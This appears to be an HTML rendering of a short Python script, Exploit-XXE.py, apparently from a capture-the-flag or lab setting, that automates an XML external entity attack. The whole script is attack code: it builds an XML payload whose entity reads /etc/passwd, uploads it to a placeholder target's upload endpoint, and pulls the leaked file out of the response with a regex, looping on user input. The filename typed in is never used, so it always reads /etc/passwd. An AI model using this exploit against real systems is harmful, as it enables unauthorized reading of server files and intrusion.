<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Exploit-XXE.py</title>
</head><body>#!/usr/bin/python<br/>
<br/>
import requests<br/>
import re<br/>
<br/>
#This is a python script that can help automate <br/>
# XXE exploitation. Simply put in your XXE PoC<br/>
# ensure the POST request syntax is correct<br/>
# and off to the races<br/>
<br/>
#The XXE PoC <br/>
def PerformXXE(filename):<br/>
&nbsp; &nbsp; xml = f"""&lt;?xml version="1.0"?&gt;<br/>
&lt;!DOCTYPE data [<br/>
&lt;!ELEMENT data (ANY)&gt;<br/>
&lt;!ENTITY plssubscribe SYSTEM "file:///etc/passwd"&gt;<br/>
]&gt;<br/>
&lt;PleaseSubscribe&gt;<br/>
&nbsp; &lt;Author&gt;Ippsec1&lt;/Author&gt;<br/>
&nbsp; &lt;Subject&gt;BEGINOUTPUT<br/>
&amp;plssubscribe;<br/>
ENDOUTPUT&lt;/Ssubject&gt;<br/>
&nbsp; &lt;Content&gt;Ippsec3&lt;/Content&gt;<br/>
&lt;/PleaseSubscribe&gt;"""<br/>
<br/>
&nbsp; &nbsp; # setup post request variables<br/>
&nbsp; &nbsp; files = { 'file' : ('pleasesubscribe.xml', xml)}<br/>
&nbsp; &nbsp; response = requests.post('http://&lt;RHOST&gt;:&lt;RPORT&gt;/upload', proxies={'http':'http://127.0.0.1:8080'}, files=files).text<br/>
<br/>
&nbsp; &nbsp; # Now Regex the BEGINOUTPUT and ENDOUTPUT<br/>
&nbsp; &nbsp; result = re.findall(r'BEGINOUTPUT\s(.*)\s\sENDOUTPUT', response, re.DOTALL) #dotall means dots match all including line breaks<br/>
&nbsp; &nbsp; return result<br/>
<br/>
while True:<br/>
&nbsp; &nbsp; fname = input("&gt; ")<br/>
&nbsp; &nbsp; print (PerformXXE(fname))<br/>
</body></html>